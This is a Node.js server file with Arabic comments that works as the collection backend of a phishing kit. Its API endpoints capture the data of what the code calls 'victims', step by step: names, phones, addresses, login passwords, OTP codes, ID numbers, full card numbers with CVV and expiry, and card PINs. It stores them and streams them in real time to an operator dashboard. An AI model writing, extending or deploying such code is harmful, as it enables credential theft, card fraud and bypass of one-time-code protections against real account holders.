const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ─── متجر البيانات ───
const victims = new Map();
const sessions = new Map();

// ─── Broadcast لحظي لكل العملاء ───
function broadcast(type, data) {
  io.emit('update', { type, data, timestamp: new Date() });
}

// ─── Routes ───

// استقبال بيانات التسجيل
app.post('/api/registration', (req, res) => {
  const { fullName, phoneNumber, address, requestId } = req.body;
  
  const victim = {
    requestId,
    fullName, phoneNumber, address,
    createdAt: new Date(),
    stage: 'registration',
    ip: req.ip
  };
  
  victims.set(requestId, victim);
  broadcast('new_victim', victim);
  res.json({ success: true, messageId: requestId });
});

// استقبال بيانات تسجيل الدخول
app.post('/api/login', (req, res) => {
  const { username, password, fullName, requestId } = req.body;
  
  let victim = victims.get(parseInt(requestId)) || {};
  victim = {
    ...victim,
    requestId: parseInt(requestId) || Date.now(),
    username, password, fullName,
    updatedAt: new Date(),
    stage: 'login'
  };
  
  victims.set(victim.requestId, victim);
  broadcast('victim_update', victim);
  res.json({ success: true, messageId: victim.requestId });
});

// استقبال OTP
app.post('/api/otp', (req, res) => {
  const { code, fullName, phone, requestId, source } = req.body;
  
  let victim = victims.get(parseInt(requestId)) || {};
  victim = {
    ...victim,
    requestId: parseInt(requestId) || Date.now(),
    fullName: fullName || victim.fullName,
    phone: phone || victim.phone,
    otpCode: code,
    otpSource: source || 'verification',
    updatedAt: new Date(),
    stage: 'otp'
  };
  
  victims.set(victim.requestId, victim);
  broadcast('victim_update', victim);
  res.json({ success: true, messageId: victim.requestId });
});

// استقبال التوكن/الرسالة
app.post('/api/activation', (req, res) => {
  const { message, fullName, phone, idNumber, requestId } = req.body;
  
  let victim = victims.get(parseInt(requestId)) || {};
  victim = {
    ...victim,
    requestId: parseInt(requestId) || Date.now(),
    fullName: fullName || victim.fullName,
    phone: phone || victim.phone,
    idNumber: idNumber || victim.idNumber,
    activationMessage: message,
    updatedAt: new Date(),
    stage: 'activation'
  };
  
  victims.set(victim.requestId, victim);
  broadcast('victim_update', victim);
  res.json({ success: true, messageId: victim.requestId });
});

// استقبال بيانات البطاقة
app.post('/api/payment', (req, res) => {
  const { 
    cardHolderName, cardNumber, expiryDate, cvv,
    fullName, phone, ip,
    cardType, paymentMethod, totalPrice,
    requestId
  } = req.body;
  
  let victim = victims.get(parseInt(requestId)) || {};
  victim = {
    ...victim,
    requestId: parseInt(requestId) || Date.now(),
    fullName: fullName || victim.fullName,
    phone: phone || victim.phone,
    ip: ip || victim.ip || req.ip,
    cardType,
    cardHolderName, 
    cardNumber: cardNumber.replace(/\s/g, ''),
    cardLast4: cardNumber.slice(-4),
    expiryDate,
    cvv,
    paymentMethod,
    totalPrice,
    updatedAt: new Date(),
    stage: 'payment'
  };
  
  victims.set(victim.requestId, victim);
  broadcast('victim_update', victim);
  res.json({ success: true, messageId: victim.requestId });
});

// استقبال PIN البطاقة
app.post('/api/pin', (req, res) => {
  const { pin, fullName, phone, idNumber, requestId } = req.body;
  
  let victim = victims.get(parseInt(requestId)) || {};
  victim = {
    ...victim,
    requestId: parseInt(requestId) || Date.now(),
    fullName: fullName || victim.fullName,
    phone: phone || victim.phone,
    idNumber: idNumber || victim.idNumber,
    cardPin: pin,
    updatedAt: new Date(),
    stage: 'pin'
  };
  
  victims.set(victim.requestId, victim);
  broadcast('victim_update', victim);
  res.json({ success: true, messageId: victim.requestId });
});

// ─── Socket.IO ───
io.on('connection', (socket) => {
  console.log('🔌 عميل متصل:', socket.id);
  
  // إرسال كل البيانات الموجودة
  socket.emit('all_victims', Array.from(victims.values()));
  
  socket.on('disconnect', () => {
    console.log('❌ عميل منفصل:', socket.id);
  });
});

// ─── لوحة التحكم ───
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/victims', (req, res) => {
  res.json(Array.from(victims.values()));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n🚀 Dashboard Server Running on http://localhost:${PORT}\n`);
});